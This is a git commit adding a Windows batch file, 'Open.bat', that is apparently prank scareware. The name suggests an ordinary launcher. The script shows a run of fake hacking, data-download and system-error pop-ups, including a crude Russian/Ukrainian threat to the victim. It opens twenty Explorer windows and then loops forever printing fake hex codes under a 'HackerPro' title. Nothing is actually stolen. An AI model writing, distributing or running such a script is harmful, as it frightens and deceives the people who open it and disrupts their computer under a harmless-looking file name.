75fa174a4721ebd230226ba333272111ba2fe6a8
NeodekvatDayz <kovtunua73@gmail.com>
2021-04-18 23:59:31 +0300

    Create Open.bat

---
+++ Open.bat
@@ -0,0 +1,61 @@
+@echo off
+ :virus
+  chcp 1251
+   msg * Connecting...
+   msg * Connecting...
+   msg * Connecting...
+   msg * Connected successfully!
+   msg * Я взломал твой ПК! Тобі П**да тікай з села!
+   msg * Ошибка системы 0х00011010110
+   msg * Ошибка системы 0х00011010110
+   msg * Ошибка системы 0х00011010110
+   msg * Ошибка системы 0х00011010110
+   msg * Скачивание данных...
+   msg * Скачивание данных...
+   msg * Скачивание данных...
+   msg * Скачивание данных...
+   msg * Ошибка скачивания...
+   msg * Перезапуск...
+   msg * Перезапуск...
+   msg * Перезапуск...
+   msg * Перезапуск...
+   msg * Скачивание данных...
+   msg * Скачивание данных...
+   msg * Скачивание данных...
+   msg * Скачивание данных...
+   msg * Скачивание данных...
+   msg * Скачивание данных завершено!
+   msg * Fatal error! System error 0x0190010119 System fault 0x0010901190
+   msg * Fatal error! System error 0x0190010119 System fault 0x0010901190
+   msg * Fatal error! System error 0x0190010119 System fault 0x0010901190
+ 
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  start explorer
+  
+ :virus2
+  color 0a
+  Title By {HackerPro}
+   echo 54 7g 4j 4r 4i 9u 1f 2s 6g 5e 88 2t 7c 55 2e 5w q2
+   echo 23 2d 3d 6e 56 w7 65 54 78 3a 45 5s 9e f5 5e 2a 2e
+   echo 4g 6e 9q 2x 6r 25 5e 8r df 4e 6t 8r 9d 5t 5n 5c 5u 9p 
+   echo 4f 4t 6y 2c 45 68 6w 54 3s kd 52 er 54 45 we 2f y2 e3
+   echo 5w 5x 86 5d 6t 5d 2c da 96 6s 5c 6r 9t 1c 8w 8s 8c c6
+ goto virus2
